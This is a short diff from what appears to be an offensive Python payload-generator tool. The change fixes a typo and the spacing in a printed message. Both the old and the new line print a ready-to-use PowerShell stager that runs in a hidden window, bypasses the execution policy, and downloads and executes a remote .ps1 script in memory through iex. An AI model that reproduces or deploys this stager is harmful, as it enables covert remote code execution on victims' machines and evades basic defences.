@@ -64,7 +64,7 @@ class Generate:
                 s.connect(("8.8.8.8", 80))
                 ip = s.getsockname()[0]
                 print(f"[+]Available on :  http://{ip}:{self.hosting_port}/{self.filename}.ps1")
-                print(f"\n[+]QUick Execute Code (hidden/run in memmory) :\n powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex (New-Object net.WebClient).DownloadString('http://{ip}:{self.hosting_port}/{self.filename}.ps1')\"\n")
+                print(f"[+]Quick Execute Code (hidden/run in memmory) :\n\n powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"iex (New-Object net.WebClient).DownloadString('http://{ip}:{self.hosting_port}/{self.filename}.ps1')\"\n")
             except Exception:
                 # Fallback to local loopback if the machine is entirely offline
                 print(f"[+]Available on :  http://127.0.0.1:{self.hosting_port}/{self.filename}.ps1")
